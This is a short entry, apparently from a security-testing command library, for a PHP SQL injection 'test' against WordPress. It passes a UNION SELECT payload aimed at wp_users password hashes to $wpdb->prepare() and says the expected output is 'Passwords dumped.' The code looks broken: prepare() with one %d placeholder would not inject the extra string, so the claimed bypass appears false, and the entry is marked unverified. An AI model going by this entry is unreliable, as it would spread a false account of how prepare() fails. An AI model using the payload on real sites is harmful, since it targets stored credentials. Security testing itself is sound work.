---
id: cmd-array-prepare-test
data: >-
  $query = array('SELECT * FROM wp_users WHERE id = %d', 1, ' UNION SELECT
  user_pass FROM wp_users --'); $result = $wpdb->prepare($query[0], $query[1],
  $query[2]); $wpdb->query($result);
tags:
  - sqli
  - wordpress
type: command
output: null
executor: php
platforms:
  - PHP
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.551Z'
verified: false
validated: true
submitted: true
---
# test-array-input-prepare

## Command

```php
$query = array('SELECT * FROM wp_users WHERE id = %d', 1, ' UNION SELECT user_pass FROM wp_users --'); $result = $wpdb->prepare($query[0], $query[1], $query[2]); $wpdb->query($result);
```

## Description

Tests array bypass in prepare() by direct usage of elements.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $query | Array with query and payload | Yes |

## Examples

### Basic Usage

```php
// As above
```

## Expected Output

Passwords dumped.

## Related

- [[procedures/Demonstrate-Array-Input-Handling-Issue]]
